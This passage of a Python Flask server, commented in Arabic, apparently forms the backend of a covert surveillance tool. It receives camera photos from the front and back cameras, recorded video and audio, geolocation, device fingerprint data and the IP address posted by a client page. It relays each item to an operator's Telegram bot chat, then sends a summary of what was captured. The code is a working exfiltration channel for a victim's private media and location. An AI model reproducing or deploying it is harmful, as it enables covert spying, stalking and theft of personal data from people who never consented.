                        requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
                    except:
                        pass
        
        # إرسال الفيديو
        if data.get('video'):
            try:
                video = data['video'].split(',', 1)[1]
                url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendVideo"
                files = {'video': base64.b64decode(video)}
                requests.post(url, data={'chat_id': chat_id, 'caption': '🎥 فيديو مسجل'}, files=files)
            except:
                pass
        
        # إرسال الصوت
        if data.get('audio'):
            try:
                audio = data['audio'].split(',', 1)[1]
                url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendAudio"
                files = {'audio': base64.b64decode(audio)}
                requests.post(url, data={'chat_id': chat_id, 'caption': '🎙 تسجيل صوتي'}, files=files)
            except:
                pass
        
        # إرسال الموقع
        if data.get('location'):
            try:
                loc = data['location']
                url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendLocation"
                requests.post(url, data={
                    'chat_id': chat_id,
                    'latitude': loc['lat'],
                    'longitude': loc['lng']
                })
            except:
                pass
        
        # إرسال معلومات الجهاز
        if data.get('device'):
            try:
                device = data['device']
                msg = f"""
📱 **معلومات الجهاز**

🖥 **المتصفح:** {device.get('userAgent', 'غير معروف')[:80]}
📱 **المنصة:** {device.get('platform', 'غير معروف')}
🌐 **اللغة:** {device.get('language', 'غير معروف')}
📺 **الشاشة:** {device.get('screen', 'غير معروف')}
🕐 **المنطقة الزمنية:** {device.get('timezone', 'غير معروف')}
⚙️ **المعالج:** {device.get('hardwareConcurrency', 'غير معروف')} نواة
💾 **الذاكرة:** {device.get('deviceMemory', 'غير معروف')} GB
                """
                url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
            except:
                pass
        
        # إرسال IP
        if data.get('ip'):
            try:
                msg = f"🌐 **IP:** `{data['ip']}`"
                url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
                requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
            except:
                pass
        
        # ملخص
        summary = f"""
✅ **تم استلام البيانات**

📷 أمامية: {len(data.get('camera_front', []))} صورة
📷 خلفية: {len(data.get('camera_back', []))} صورة
🎥 فيديو: {'✅' if data.get('video') else '❌'}
🎙 صوت: {'✅' if data.get('audio') else '❌'}
📍 موقع: {'✅' if data.get('location') else '❌'}
📱 معلومات الجهاز: {'✅' if data.get('device') else '❌'}
🌐 IP: {data.get('ip', 'غير معروف')}
        """
        url = f"https://api.telegram.org/bot{config.BOT_TOKEN}/sendMessage"
        requests.post(url, data={'chat_id': chat_id, 'text': summary, 'parse_mode': 'Markdown'})
        
        return jsonify({'status': 'ok'})
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
#  تشغيل السيرفر
# ============================================================
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)